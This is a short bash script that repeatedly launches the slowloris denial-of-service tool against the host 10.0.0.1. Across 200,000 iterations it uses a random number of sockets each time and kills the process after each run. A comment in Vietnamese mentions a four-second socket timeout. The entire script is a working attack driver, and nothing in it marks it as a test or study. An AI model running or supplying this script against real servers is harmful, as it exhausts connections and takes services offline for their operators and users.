#!/bin/bash

for i in {1..200000}
do
    socket=$((RANDOM%500+200))
    python3 slowloris.py 10.0.0.1 -s $socket
    # sleep 4 # Vi timeout socket la 4
    pgrep -a python3 | grep slowloris.py | awk '{print $1}' | xargs kill
    

done